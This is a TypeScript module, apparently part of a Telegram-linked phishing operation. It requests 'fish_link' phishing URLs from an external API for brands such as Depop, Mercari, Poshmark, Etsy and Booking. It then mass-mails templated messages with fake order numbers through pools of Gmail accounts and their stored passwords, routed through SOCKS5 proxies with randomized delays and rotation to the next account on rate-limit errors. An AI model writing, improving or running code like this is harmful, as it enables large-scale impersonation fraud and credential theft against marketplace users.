import * as nodemailer from 'nodemailer';
import { SocksClient } from 'socks';
import { prisma } from './db.js';

const LINK_API_URL = 'https://api.k7r4q9p2z1x1.cfd/api/protected';

const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

export const mailingState: Record<string, any> = {};

const platformToService: Record<string, string> = {
    MERCARI_USA: 'mercari3_usa',
    OFFERUP_USA: 'offerup3_usa',
    DEPOP_USA: 'depop3_usa',
    DEPOP_UK: 'depop3_uk',
    POSHMARK_USA: 'poshmark3_eu',
    ETSY: 'etsy_eu',
    BOOKING: 'booking_eu_parse'
};

async function generateLink(platform: string, userId: string, title: string, userToken: string): Promise<any> {
    try {
        const service = platformToService[platform] || 'depop3_usa';
        const response = await fetch(LINK_API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ api_key: userToken, title, service, userId })
        });
        if (!response.ok) throw new Error(`API статус: ${response.status}`);
        return await response.json();
    } catch (err: any) {
        return { message: '#', fish_link: '#', search_link: '#' };
    }
}

export async function runMailing(
    config: { delayRange: { min: number; max: number }; userId: string },
    logCallback: (msg: string) => void
) {
    const { userId } = config;
    const template = await prisma.template.findFirst({ where: { telegramId: userId, isActive: true } });
    const accounts = await prisma.emailAccount.findMany({ where: { isActive: true, telegramId: userId } });
    const user = await prisma.user.findUnique({ where: { telegramId: userId } });

    if (!template || accounts.length === 0 || !user?.token) {
        logCallback("❌ Ошибка: проверьте шаблон, аккаунты или токен.");
        return;
    }

    mailingState[userId] = 'RUNNING';
    logCallback(`🚀 Запуск параллельной рассылки (по 5 потокам)...`);

    const CONCURRENCY = 5;
    for (let i = 0; i < accounts.length; i += CONCURRENCY) {
        if (mailingState[userId] === 'STOPPED') break;
        const chunk = accounts.slice(i, i + CONCURRENCY);
        await Promise.all(chunk.map(acc => processAccount(acc, template, config, logCallback, userId, user.token, user.proxy)));
    }

    logCallback("🏁 Все потоки завершены.");
    mailingState[userId] = 'STOPPED';
}

async function processAccount(
    account: any,
    template: any,
    config: any,
    logCallback: (msg: string) => void,
    userId: string,
    userToken: string,
    userProxy: string | null
) {
    let recipientsList: { email: string; name: string }[] = [];
    try {
        recipientsList = account.recipients ? JSON.parse(account.recipients) : [];
    } catch { return; }

    // 🔑 ОТКРЫТЬ СОКЕТ ОДИН РАЗ В НАЧАЛЕ
    let transporter;
    if (userProxy) {
        const proxyUrl = new URL(userProxy);
        const proxyHost = proxyUrl.hostname;
        const proxyPort = parseInt(proxyUrl.port, 10);
        const proxyAuth = proxyUrl.username ? { userId: proxyUrl.username, password: proxyUrl.password } : undefined;

        const info = await SocksClient.createConnection({
            proxy: {
                host: proxyHost,
                port: proxyPort,
                type: 5,
                userId: proxyAuth?.userId,
                password: proxyAuth?.password
            },
            command: 'connect',
            destination: {
                host: 'smtp.gmail.com',
                port: 587
            }
        });

        transporter = nodemailer.createTransport({
            socket: info.socket,
            host: 'smtp.gmail.com',
            port: 587,
            secure: false,
            requireTLS: true,
            auth: { user: account.email, pass: account.password },
            connectionTimeout: 20000,
            socketTimeout: 20000
        } as any);
    } else {
        transporter = nodemailer.createTransport({
            host: 'smtp.gmail.com',
            port: 465,
            secure: true,
            auth: { user: account.email, pass: account.password },
            connectionTimeout: 15000,
            socketTimeout: 15000
        });
    }

    try {
        // 🔑 ОТПРАВИТЬ ВСЕ ПИСЬМА ЧЕРЕЗ ОДИН СОКЕТ
        for (let i = account.currentIndex; i < recipientsList.length; i++) {
            if (mailingState[userId] === 'STOPPED') break;
            while (mailingState[userId] === 'PAUSED') {
                await delay(1000);
                if (mailingState[userId] === 'STOPPED') return;
            }

            const recipient = recipientsList[i];

            try {
                // Извлекаем Telegram ID воркера из аккаунта, либо используем userId как запасной вариант
                const currentWorkerId = String(account.telegramId || userId);

                // Передаем правильный ID в функцию генерации ссылки
                const linkData = await generateLink(template.platform, currentWorkerId, recipient.name || '', userToken);

                let body = template.body
                    .replace(/{{ORDER_ID}}/g, `#${Math.floor(Math.random() * 90000 + 10000)}`)
                    .replace(/{{LINK}}/g, linkData.message || '#')
                    .replace(/{{FISH_LINK}}/g, linkData.fish_link || '#')
                    .replace(/{{SEARCH_LINK}}/g, linkData.search_link || '#')
                    .replace(/{{NAME}}/g, recipient.name);

                if (mailingState[userId] === 'STOPPED') break;

                await transporter.sendMail({
                    from: template.senderName ? `${template.senderName} <${account.email}>` : account.email,
                    to: recipient.email,
                    subject: template.subject,
                    [template.type === 'HTML' ? 'html' : 'text']: body
                });

                await prisma.emailAccount.update({ where: { id: account.id }, data: { currentIndex: i + 1 } });
                await prisma.log.create({
                    data: {
                        status: 'SUCCESS',
                        fromEmail: account.email,
                        toEmail: recipient.email,
                        telegramId: userId
                    }
                });

                logCallback(`✅ [${account.email}] → ${recipient.email}`);

                const sleep = Math.floor(Math.random() * (config.delayRange.max - config.delayRange.min + 1) + config.delayRange.min) * 1000;
                const start = Date.now();
                while (Date.now() - start < sleep) {
                    if (mailingState[userId] === 'STOPPED') return;
                    await delay(500);
                }

            } catch (err: any) {
                console.error(`❌ Ошибка [${account.email}]:`, err.message);

                await prisma.log.create({
                    data: {
                        status: 'ERROR',
                        fromEmail: account.email,
                        toEmail: recipient?.email || 'unknown',
                        telegramId: userId
                    }
                });

                if (err.message && (err.message.includes('Authentication') || err.message.includes('limit') || err.message.includes('exceeded'))) {
                    break;
                }

                await delay(5000);
            }
        }
    } finally {
        // 🔑 ЗАКРЫТЬ СОКЕТ В КОНЦЕ (один раз)
        transporter.close();
    }
}